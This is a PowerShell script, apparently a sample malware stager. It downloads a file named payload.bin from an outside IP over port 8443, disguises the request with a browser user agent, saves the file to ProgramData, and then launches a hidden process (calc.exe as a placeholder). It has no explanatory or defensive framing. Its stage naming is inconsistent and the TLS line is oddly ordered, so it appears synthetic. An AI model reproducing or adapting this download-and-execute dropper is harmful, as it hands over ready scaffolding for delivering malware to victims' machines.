
$Stage1Url = 'https://192.0.2.219:8443/stage1.ps1'
$WorkingPath = "C:\ProgramData\payload.bin"
$TransferTimeout = 47
$UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
$ErrorActionPreference = "Stop"

function Invoke-Stage2Download {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$OperationResult = Invoke-Stage2Download -SourceUrl $Stage1Url -DestinationPath $WorkingPath -TimeoutSec $TransferTimeout -UserAgent $UserAgent
if ($OperationResult) {
    Start-Process -FilePath "calc.exe" -WindowStyle Hidden
}

Start-Sleep -Seconds 15
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
